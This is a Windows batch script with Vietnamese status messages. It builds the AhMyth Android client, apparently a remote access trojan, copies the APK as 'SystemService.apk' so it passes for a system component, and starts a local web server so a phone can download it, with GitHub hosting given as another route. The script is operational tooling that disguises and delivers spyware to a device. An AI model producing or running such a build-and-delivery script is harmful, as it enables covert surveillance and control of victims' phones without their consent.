@echo off
chcp 65001 >nul
title Fix Build AhMyth Script

echo ========================================================
echo        TOOL TU DONG SUA LOI VA BUILD APK (AHMYTH)
echo ========================================================
echo.
echo [1/4] Dang lam sach Project cu...
cd AhMyth-Client
call gradlew.bat clean

echo.
echo [2/4] Dang bat dau Build (Bo qua cac loi Lint khong can thiet)...
echo Qua trinh nay mat khoang 2-3 phut. Vui long cho...
call gradlew.bat assembleDebug -x lint

if %ERRORLEVEL% NEQ 0 (
    echo.
    echo [THAT BAI] Van con loi xay ra.
    echo Vui long kiem tra lai Android SDK hoac mo bang Android Studio.
    pause
    exit /b
)

cd ..
echo.
echo [3/4] Build thanh cong! Dang copy file...
if not exist "docs" mkdir docs
copy "AhMyth-Client\app\build\outputs\apk\debug\app-debug.apk" "docs\SystemService.apk" /Y

echo.
echo [4/4] KHOI DONG SERVER TAI XUONG...
echo.
echo ========================================================
echo THANH CONG! File APK da san sang.
echo Hay mo trinh duyet tren dien thoai va truy cap:
echo.
echo      http://192.168.1.2:8080/download/SystemService.apk
echo.
echo Hoac tai len GitHub theo thu muc 'docs'.
echo ========================================================
echo Dang chay Web Server... (Dung tat cua so nay)
node AhMyth-Website/server.js
pause
